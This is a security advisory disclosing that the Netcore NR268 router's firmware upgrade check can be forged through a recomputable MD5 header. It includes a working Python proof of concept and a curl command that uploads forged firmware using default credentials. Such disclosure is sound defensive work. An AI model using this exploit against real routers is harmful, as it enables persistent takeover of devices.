# Netcore NR268 Forgeable Firmware Authenticity Check in the Upgrade Path

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Insufficient Verification of Data Authenticity (CWE-345)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

The NR268 firmware authenticity check is forgeable. `mtd_write` accepts an image when bytes `0x20..0x2f` equal `MD5(MD5(file[0x50:]) || hardcoded_constant)` and does not verify a vendor signature, public key, or device secret. An attacker who can reach the firmware upload route can modify a valid image, recompute the accepted header locally, and install the forged firmware.

## Technical Details

`/router/put_file.cgi` forwards the uploaded image to `/bin/mtd_write`. The helper `check_image_uuid` recomputes a 16-byte header field as:

```
header[0x20..0x2f] == MD5( MD5(file[0x50:]) || "RRA2C8NCRNR268" )
```

The constant `RRA2C8NCRNR268` is embedded in the firmware. There is no public-key signature, HMAC, or device-bound secret. Anyone who can supply an image can:

1. take a genuine `NR268-V1.7.121109.bin`
2. modify any payload byte at offset `0x50` or later
3. recompute bytes `0x20..0x2f` with the same MD5 construction
4. upload the result through the normal upgrade page

The forged file differs from the original only at `0x20..0x2f` and the mutated payload byte, and still passes the authenticity check.

### Affected Endpoint

- URL: `/router/put_file.cgi`
- Parameters: multipart field `put_file`
- Method: POST
- Authentication: HTTP Basic authentication to the firmware upload route

## Proof of Concept

```python
#!/usr/bin/env python3
import hashlib
import sys
from pathlib import Path

CONST = b"RRA2C8NCRNR268"
src, dst = sys.argv[1], sys.argv[2]
data = bytearray(Path(src).read_bytes())
if len(data) < 0x51:
    raise SystemExit("image too short")
data[0x50] ^= 0x01
digest = hashlib.md5(hashlib.md5(data[0x50:]).digest() + CONST).digest()
data[0x20:0x30] = digest
Path(dst).write_bytes(data)
print("new_header", digest.hex())
```

```bash
python3 recompute_fw_md5_header.py NR268-V1.7.121109.bin NR268-forged.bin
xxd -p -l 16 -s 0x20 NR268-V1.7.121109.bin
xxd -p -l 16 -s 0x20 NR268-forged.bin

curl -s -u admin:admin -F "put_file=@NR268-forged.bin;filename=NR268-forged.bin" \
  "http://192.168.1.1/router/put_file.cgi"
```

### Outcome

The recomputed header is accepted as authentic. The forged image changes only at `0x20..0x2f` and `0x50`, and `/router/put_file.cgi` forwards it to `mtd_write` without a vendor-private signature check.

## Impact

- **Confidentiality:** High
- **Integrity:** High – attacker-controlled firmware can be installed
- **Availability:** High

Successful abuse persists across reboot and fully compromises the device.
